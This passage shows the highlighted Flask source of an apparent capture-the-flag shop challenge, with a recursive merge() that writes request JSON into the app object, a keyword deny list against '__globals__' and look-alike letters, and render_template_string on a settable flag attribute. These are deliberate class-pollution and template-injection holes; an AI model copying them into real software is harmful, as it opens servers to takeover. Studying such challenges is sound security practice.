password</span>):</span><br><span class="line">        <span class="keyword">return</span> self.password == password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Product</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, price, stock, owner=<span class="literal">None</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.price = price</span><br><span class="line">        self.stock = stock</span><br><span class="line">        self.owner = owner</span><br><span class="line">        self.is_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.identity = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 数据存储 ====================</span></span><br><span class="line">users = []</span><br><span class="line">products = []</span><br><span class="line">admin_obj = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">body: <span class="built_in">str</span>, forbidden=[<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;і&#x27;</span>, <span class="string">&#x27;а&#x27;</span>, <span class="string">&#x27;е&#x27;</span>, <span class="string">&#x27;о&#x27;</span>, <span class="string">&#x27;р&#x27;</span>, <span class="string">&#x27;с&#x27;</span>, <span class="string">&#x27;х&#x27;</span>, <span class="string">&#x27;у&#x27;</span>, <span class="string">&#x27;І&#x27;</span>, <span class="string">&#x27;А&#x27;</span>, <span class="string">&#x27;Е&#x27;</span>, <span class="string">&#x27;О&#x27;</span>, <span class="string">&#x27;Р&#x27;</span>, <span class="string">&#x27;С&#x27;</span>, <span class="string">&#x27;Х&#x27;</span>, <span class="string">&#x27;У&#x27;</span>,<span class="string">&#x27;static&#x27;</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(body, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = json.loads(body)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_string</span>(<span class="params">s</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot;检查字符串是否包含禁用词&quot;&quot;&quot;</span></span><br><span class="line">            s_str = <span class="built_in">str</span>(s).lower()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 直接检查禁用词（包括西里尔字母）</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> forbidden:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> s_str:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_values</span>(<span class="params">obj</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>):</span><br><span class="line">                <span class="keyword">for</span> key, value <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> check_string(key):</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> check_values(value):</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">list</span>):</span><br><span class="line">                <span class="keyword">for</span> item <span class="keyword">in</span> obj:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> check_values(item):</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check_string(obj):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> check_values(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================== 路由 ====================</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.form</span><br><span class="line"></span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;注册失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;用户名和密码不能为空&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;register&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回注册&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> u.username == username:</span><br><span class="line">            <span class="keyword">if</span> request.is_json:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户名已存在&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                                   <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                                   title=<span class="string">&#x27;注册失败&#x27;</span>,</span><br><span class="line">                                   message=<span class="string">&#x27;用户名已存在&#x27;</span>,</span><br><span class="line">                                   back_url=url_for(<span class="string">&#x27;register&#x27;</span>),</span><br><span class="line">                                   back_text=<span class="string">&#x27;返回注册&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    user = User(username=username, password=password)</span><br><span class="line">    users.append(user)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;注册成功&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;balance&#x27;</span>: user.balance&#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                           <span class="built_in">type</span>=<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">                           title=<span class="string">&#x27;注册成功&#x27;</span>,</span><br><span class="line">                           message=<span class="string">f&#x27;&lt;p&gt;用户名: <span class="subst">&#123;username&#125;</span>&lt;/p&gt;&lt;p&gt;初始余额: 1000&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                           back_url=url_for(<span class="string">&#x27;login&#x27;</span>),</span><br><span class="line">                           back_text=<span class="string">&#x27;去登录&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.form</span><br><span class="line"></span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;登录失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;用户名和密码不能为空&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;login&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回登录&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> u.username == username <span class="keyword">and</span> u.verify_password(password):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;identity&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">if</span> u.is_admin <span class="keyword">else</span> <span class="string">&#x27;guest&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> request.is_json:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;登录成功&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                    <span class="string">&#x27;identity&#x27;</span>: session[<span class="string">&#x27;identity&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;balance&#x27;</span>: u.balance</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;用户名或密码错误&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                           <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                           title=<span class="string">&#x27;登录失败&#x27;</span>,</span><br><span class="line">                           message=<span class="string">&#x27;用户名或密码错误&#x27;</span>,</span><br><span class="line">                           back_url=url_for(<span class="string">&#x27;login&#x27;</span>),</span><br><span class="line">                           back_text=<span class="string">&#x27;返回登录&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/products&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_products</span>():</span><br><span class="line">    response = render_template(<span class="string">&#x27;products.html&#x27;</span>, products=<span class="built_in">enumerate</span>(products))</span><br><span class="line">    resp = make_response(response)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Cache-Control&#x27;</span>] = <span class="string">&#x27;no-store, no-cache, must-revalidate, max-age=0&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Pragma&#x27;</span>] = <span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">    resp.headers[<span class="string">&#x27;Expires&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/products/add&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_product</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                                   <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                                   title=<span class="string">&#x27;访问被拒绝&#x27;</span>,</span><br><span class="line">                                   message=<span class="string">&#x27;需要管理员权限&#x27;</span>,</span><br><span class="line">                                   back_url=url_for(<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">                                   back_text=<span class="string">&#x27;返回首页&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;需要管理员权限&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;访问被拒绝&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;需要管理员权限&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;add_product.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.form</span><br><span class="line"></span><br><span class="line">    name = data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    price = <span class="built_in">float</span>(data.get(<span class="string">&#x27;price&#x27;</span>, <span class="number">10.0</span>))</span><br><span class="line">    stock = <span class="built_in">int</span>(data.get(<span class="string">&#x27;stock&#x27;</span>, <span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;上传失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;商品名称不能为空&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;add_product&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    product = Product(name=name, price=price, stock=stock, owner=username)</span><br><span class="line">    products.append(product)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;商品创建成功&#x27;</span>, <span class="string">&#x27;product_id&#x27;</span>: <span class="built_in">len</span>(products) - <span class="number">1</span>&#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;get_products&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/products/&lt;int:product_id&gt;/edit&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_product_page</span>(<span class="params">product_id</span>):</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;权限不足&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;需要管理员权限&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> product_id &gt;= <span class="built_in">len</span>(products):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;错误&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;商品不存在&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    product = products[product_id]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;update_product.html&#x27;</span>, product_id=product_id, product=product)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/products/&lt;int:product_id&gt;/update&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_product</span>(<span class="params">product_id</span>):</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;请先登录&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;identity&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;需要管理员权限&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> product_id &gt;= <span class="built_in">len</span>(products):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;商品不存在&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    product = products[product_id]</span><br><span class="line"></span><br><span class="line">    raw_body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> forbidden(raw_body):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;可恶的hack,不要破坏商店&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">dict</span>):</span><br><span class="line">        payload_product = data.get(<span class="string">&#x27;product&#x27;</span>) <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(payload_product, <span class="built_in">dict</span>):</span><br><span class="line">            name_val = payload_product.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">            price_val = payload_product.get(<span class="string">&#x27;price&#x27;</span>)</span><br><span class="line">            stock_val = payload_product.get(<span class="string">&#x27;stock&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> name_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> name_val != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                product.name = <span class="built_in">str</span>(name_val)</span><br><span class="line">            <span class="keyword">if</span> price_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    product.price = <span class="built_in">float</span>(price_val)</span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> stock_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    product.stock = <span class="built_in">int</span>(stock_val)</span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = &#123;<span class="string">&#x27;product&#x27;</span>: product, <span class="string">&#x27;app&#x27;</span>: app&#125;</span><br><span class="line">        merge(data, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;商品更新成功&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: product.name,</span><br><span class="line">            <span class="string">&#x27;stock&#x27;</span>: product.stock</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/products/&lt;int:product_id&gt;/buy&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_product</span>(<span class="params">product_id</span>):</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> product_id &gt;= <span class="built_in">len</span>(products):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;购买失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;商品不存在&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    product = products[product_id]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> product.stock &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;购买失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">&#x27;商品库存不足&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    current_user = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> u.username == username:</span><br><span class="line">            current_user = u</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.balance &lt; product.price:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;购买失败&#x27;</span>,</span><br><span class="line">                               message=<span class="string">f&#x27;余额不足！当前余额: ¥<span class="subst">&#123;current_user.balance&#125;</span>&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    current_user.balance -= product.price</span><br><span class="line">    product.stock -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> product.is_flag:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag_display = <span class="built_in">getattr</span>(app, <span class="string">&#x27;flag_content&#x27;</span>, <span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">            rendered_flag = render_template_string(</span><br><span class="line">                <span class="built_in">str</span>(flag_display),</span><br><span class="line">                app=app,</span><br><span class="line">                config=app.config,</span><br><span class="line">                session=session,</span><br><span class="line">                user=current_user,</span><br><span class="line">                product=product</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            rendered_flag = <span class="built_in">str</span>(<span class="built_in">getattr</span>(app, <span class="string">&#x27;flag_content&#x27;</span>, <span class="string">&#x27;xxxx&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                               <span class="built_in">type</span>=<span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                               title=<span class="string">&#x27;恭喜你！&#x27;</span>,</span><br><span class="line">                               message=<span class="string">f&#x27;&lt;h2 style=&quot;color:#667eea;word-break:break-all;margin:20px 0;&quot;&gt;<span class="subst">&#123;rendered_flag&#125;</span>&lt;/h2&gt;&lt;p&gt;你成功获得了FLAG！&lt;/p&gt;&#x27;</span>,</span><br><span class="line">                               back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                               back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,</span><br><span class="line">                           <span class="built_in">type</span>=<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">                           title=<span class="string">&#x27;购买成功&#x27;</span>,</span><br><span class="line">                           message=<span class="string">f&#x27;剩余余额: ¥<span class="subst">&#123;current_user.balance&#125;</span>&#x27;</span>,</span><br><span class="line">                           back_url=url_for(<span class="string">&#x27;get_products&#x27;</span>),</span><br><span class="line">                           back_text=<span class="string">&#x27;返回商品列表&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span 